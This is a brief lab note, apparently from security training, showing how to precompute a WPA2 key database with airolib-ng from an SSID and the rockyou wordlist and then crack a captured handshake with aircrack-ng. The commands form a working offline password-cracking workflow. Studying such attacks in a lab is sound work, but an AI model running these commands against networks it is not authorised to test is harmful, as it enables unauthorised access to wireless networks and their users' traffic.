
## Lab: WPA2 Precomputed Dictionary Attack with Airolib-ng

---

###  Goal

Generate a PMK database using `airolib-ng` to speed up WPA2 cracking.

---

###  Step-by-Step

1. Create database:

```bash
airolib-ng wpabase.db --import essid YourSSID
airolib-ng wpabase.db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng wpabase.db --batch
```

2. Crack:

```bash
aircrack-ng -r wpabase.db capture.cap
```

> This avoids re-deriving keys for each password.

---
